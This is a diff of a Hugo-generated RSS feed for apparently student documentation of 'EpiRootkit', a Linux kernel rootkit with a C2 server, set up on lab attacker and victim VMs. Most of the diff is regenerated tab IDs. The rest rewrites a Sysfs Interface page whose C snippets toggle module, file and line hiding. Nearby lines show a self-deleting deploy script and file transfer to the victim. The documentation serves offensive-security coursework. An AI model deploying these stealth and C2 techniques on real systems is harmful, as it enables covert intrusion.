@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Wed, 04 Jun 2025 21:01:05 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Wed, 04 Jun 2025 22:00:39 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -28,14 +28,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="dcafbeTab" data-bs-toggle="tab" data-bs-target="#dcafbe"
-		 type="button" role="tab" aria-controls="dcafbe" aria-selected="true">Automated Setup (Recommended)&lt;/a>
+		 id="cdbafeTab" data-bs-toggle="tab" data-bs-target="#cdbafe"
+		 type="button" role="tab" aria-controls="cdbafe" aria-selected="true">Automated Setup (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="abcfedTab" data-bs-toggle="tab" data-bs-target="#abcfed"
-		 type="button" role="tab" aria-controls="abcfed" aria-selected="true">Manual Step-by-Step&lt;/a>
+		 id="efbdacTab" data-bs-toggle="tab" data-bs-target="#efbdac"
+		 type="button" role="tab" aria-controls="efbdac" aria-selected="true">Manual Step-by-Step&lt;/a>
 
 		
 
@@ -52,7 +52,7 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="dcafbe" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="cdbafe" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="one-command-installation">One-Command Installation &lt;a href="#one-command-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Run the automated setup script to install all dependencies:&lt;/p>
 
@@ -91,7 +91,7 @@
 
 
 
-&lt;div class="tab-pane fade" id="abcfed" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade" id="efbdac" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="1-update-system">1. Update System &lt;a href="#1-update-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -199,14 +199,14 @@ sudo apt install -y hugo&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="fabcdeTab" data-bs-toggle="tab" data-bs-target="#fabcde"
-		 type="button" role="tab" aria-controls="fabcde" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
+		 id="abcdefTab" data-bs-toggle="tab" data-bs-target="#abcdef"
+		 type="button" role="tab" aria-controls="abcdef" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="dfabecTab" data-bs-toggle="tab" data-bs-target="#dfabec"
-		 type="button" role="tab" aria-controls="dfabec" aria-selected="true">Build Disks Yourself&lt;/a>
+		 id="defbcaTab" data-bs-toggle="tab" data-bs-target="#defbca"
+		 type="button" role="tab" aria-controls="defbca" aria-selected="true">Build Disks Yourself&lt;/a>
 
 		
 
@@ -223,7 +223,7 @@ sudo apt install -y hugo&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="fabcde" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="abcdef" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacker VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;h1 id="attacker-vm-setup">Attacker VM Setup &lt;a href="#attacker-vm-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Configure the attacking VM with Node.js C2 server and React web interface.&lt;/p>
 &lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
@@ -250,14 +250,14 @@ sudo apt install -y hugo&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="edcfabTab" data-bs-toggle="tab" data-bs-target="#edcfab"
-		 type="button" role="tab" aria-controls="edcfab" aria-selected="true">Pre-built Disk (Recommended)&lt;/a>
+		 id="fbeacdTab" data-bs-toggle="tab" data-bs-target="#fbeacd"
+		 type="button" role="tab" aria-controls="fbeacd" aria-selected="true">Pre-built Disk (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="fceabdTab" data-bs-toggle="tab" data-bs-target="#fceabd"
-		 type="button" role="tab" aria-controls="fceabd" aria-selected="true">Self-build from Scratch&lt;/a>
+		 id="dfbeacTab" data-bs-toggle="tab" data-bs-target="#dfbeac"
+		 type="button" role="tab" aria-controls="dfbeac" aria-selected="true">Self-build from Scratch&lt;/a>
 
 		
 
@@ -274,7 +274,7 @@ sudo apt install -y hugo&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="edcfab" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="fbeacd" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Everything is already set up, so you can immediately build and run:&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;h1 id="victim-vm-setup">Victim VM Setup &lt;a href="#victim-vm-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Deploy the EpiRootkit kernel module on the victim system.&lt;/p>
 &lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
@@ -355,26 +355,26 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="dceabfTab" data-bs-toggle="tab" data-bs-target="#dceabf"
-		 type="button" role="tab" aria-controls="dceabf" aria-selected="true">Automated Script (Recommended)&lt;/a>
+		 id="dbfeacTab" data-bs-toggle="tab" data-bs-target="#dbfeac"
+		 type="button" role="tab" aria-controls="dbfeac" aria-selected="true">Automated Script (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="cadebfTab" data-bs-toggle="tab" data-bs-target="#cadebf"
-		 type="button" role="tab" aria-controls="cadebf" aria-selected="true">Manual SCP/SSH&lt;/a>
+		 id="cbfadeTab" data-bs-toggle="tab" data-bs-target="#cbfade"
+		 type="button" role="tab" aria-controls="cbfade" aria-selected="true">Manual SCP/SSH&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="cdfeabTab" data-bs-toggle="tab" data-bs-target="#cdfeab"
-		 type="button" role="tab" aria-controls="cdfeab" aria-selected="true">HTTP Server&lt;/a>
+		 id="caefbdTab" data-bs-toggle="tab" data-bs-target="#caefbd"
+		 type="button" role="tab" aria-controls="caefbd" aria-selected="true">HTTP Server&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="fbdcaeTab" data-bs-toggle="tab" data-bs-target="#fbdcae"
-		 type="button" role="tab" aria-controls="fbdcae" aria-selected="true">Other Methods&lt;/a>
+		 id="eabdcfTab" data-bs-toggle="tab" data-bs-target="#eabdcf"
+		 type="button" role="tab" aria-controls="eabdcf" aria-selected="true">Other Methods&lt;/a>
 
 		
 
@@ -391,7 +391,7 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="dceabf" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="dbfeac" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="one-command-transfer">One-Command Transfer &lt;a href="#one-command-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>For attacker VM setup, use the automated deployment script:&lt;/p>
 
@@ -440,7 +440,7 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 
 
 
-&lt;div class="tab-pane fade" id="cadebf" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade" id="cbfade" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="enable-ssh-in-vm">Enable SSH in VM &lt;a href="#enable-ssh-in-vm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -497,7 +497,7 @@ scp deploy_rootkit.sh epirootkit.ko victim@192.168.200.10:~/&lt;/code>
 
 
 
-&lt;div class="tab-pane fade" id="cdfeab" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade" id="caefbd" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="setup-server-on-host">Setup Server on Host &lt;a href="#setup-server-on-host" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -553,7 +553,7 @@ wget -r -np -nH --cut-dirs=1 http://192.168.200.1:8080/&lt;/code>
 
 
 
-&lt;div class="tab-pane fade" id="fbdcae" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade" id="eabdcf" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="shared-folders-development">Shared Folders (Development) &lt;a href="#shared-folders-development" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Add to QEMU launch:&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h1 id="c2-server-overview">C2 Server Overview &lt;a href="#c2-server-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Command &amp;amp; Control server for managing EpiRootkit connections.&lt;/p>
 &lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
@@ -1744,53 +1744,7 @@ static void xor_crypt(const u8 *input, u8 *output, size_t length)
 }&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Simple XOR cipher with key rotation - same operation for encryption and decryption.&lt;/p></description></item><item><title>Sysfs Interface</title><link>/docs/05-epirootkit/features/sysfs-interface/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/sysfs-interface/</guid><description>&lt;h1 id="sysfs-interface">Sysfs Interface &lt;a href="#sysfs-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux sysfs interface for rootkit control using octal permission-style configuration (like Linux file permissions).&lt;/p>
-&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="5c74fd8" class="language-c ">
- &lt;code>/* Octal hide control (like file permissions)
- * 1: Module hidden 2: Files hidden 4: Lines hidden
- * Examples: 0=visible, 1=module, 3=module&amp;#43;files, 7=all hidden */
-
-static void update_hide_state(int mode)
-{
- /* Module hiding (bit 0) */
- if (mode &amp;amp; 1) {
- if (!is_module_hidden()) hide_module();
- } else {
- if (is_module_hidden()) unhide_module();
- }
- 
- /* File hiding (bit 1) */
- if (mode &amp;amp; 2) {
- if (!is_file_hiding_enabled()) enable_file_hiding();
- } else {
- if (is_file_hiding_enabled()) disable_file_hiding();
- }
- 
- /* Line hiding (bit 2) */
- if (mode &amp;amp; 4) {
- if (!is_line_hiding_enabled()) enable_line_hiding();
- } else {
- if (is_line_hiding_enabled()) disable_line_hiding();
- }
-}&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;p>Uses 3-bit octal system (0-7) where each bit controls a stealth feature.&lt;/p></description></item><item><title>Module Hiding</title><link>/docs/05-epirootkit/features/module-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/module-hiding/</guid><description>&lt;h1 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
+&lt;p>Simple XOR cipher with key rotation - same operation for encryption and decryption.&lt;/p></description></item><item><title>Module Hiding</title><link>/docs/05-epirootkit/features/module-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/module-hiding/</guid><description>&lt;h1 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
 &lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -2136,7 +2090,40 @@ int handle_download(const char *data)
 }&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Files are encoded in base64 for JSON protocol compatibility.&lt;/p></description></item><item><title>Tux Fan Club: Chasse au Trésor Pirate</title><link>/docs/06-bonuses/wlkom-ctf/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/06-bonuses/wlkom-ctf/</guid><description>&lt;h2 id="treasure-hunt-">Treasure Hunt 🪙 &lt;a href="#treasure-hunt-" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="découverte-dun-mystérieux-fichier">Découverte d&amp;rsquo;un mystérieux fichier&amp;hellip; &lt;a href="#d%c3%a9couverte-dun-myst%c3%a9rieux-fichier" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Nous avons décidé d&amp;rsquo;accepter une &lt;em>quête secondaire&lt;/em> durant le projet &lt;code>Rootkit&lt;/code>.&lt;/p>
+&lt;p>Files are encoded in base64 for JSON protocol compatibility.&lt;/p></description></item><item><title>Sysfs Interface</title><link>/docs/05-epirootkit/features/sysfs-interface/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/sysfs-interface/</guid><description>&lt;h1 id="sysfs-interface">Sysfs Interface &lt;a href="#sysfs-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux sysfs interface with octal permission-style configuration for rootkit control.&lt;/p>
+&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Directory: &lt;code>/sys/kernel/epirootkit/&lt;/code>&lt;/p>
+&lt;p>Uses an octal bitmask system where each bit controls specific stealth features:&lt;/p>
+&lt;ul>
+&lt;li>Bit 0 (1): Module hiding&lt;/li>
+&lt;li>Bit 1 (2): File hiding&lt;/li>
+&lt;li>Bit 2 (4): Line hiding&lt;/li>
+&lt;/ul>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="1a7d116" class="language-c ">
+ &lt;code>static void update_hide_state(int mode)
+{
+ if (mode &amp;amp; 1) enable_module_hiding();
+ if (mode &amp;amp; 2) enable_file_hiding();
+ if (mode &amp;amp; 4) enable_line_hiding();
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="sysfs-files">Sysfs Files &lt;a href="#sysfs-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>&lt;code>/sys/kernel/epirootkit/hide&lt;/code>&lt;/strong> - Controls stealth features
+&lt;strong>&lt;code>/sys/kernel/epirootkit/unhide&lt;/code>&lt;/strong> - Quick disable all hiding&lt;/p></description></item><item><title>Tux Fan Club: Chasse au Trésor Pirate</title><link>/docs/06-bonuses/wlkom-ctf/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/06-bonuses/wlkom-ctf/</guid><description>&lt;h2 id="treasure-hunt-">Treasure Hunt 🪙 &lt;a href="#treasure-hunt-" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="découverte-dun-mystérieux-fichier">Découverte d&amp;rsquo;un mystérieux fichier&amp;hellip; &lt;a href="#d%c3%a9couverte-dun-myst%c3%a9rieux-fichier" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Nous avons décidé d&amp;rsquo;accepter une &lt;em>quête secondaire&lt;/em> durant le projet &lt;code>Rootkit&lt;/code>.&lt;/p>
 &lt;p>En effet, comme tout bon pirate, nous avons téléchargé &lt;em>légalement&lt;/em> les fichiers fournis (&lt;code>given files&lt;/code>) et nous souhaitions les ignorer avec un fichier &lt;code>.gitignore&lt;/code>.&lt;/p>
 &lt;p>Le &lt;code>.gitignore&lt;/code> ressemblait à :&lt;/p>
 
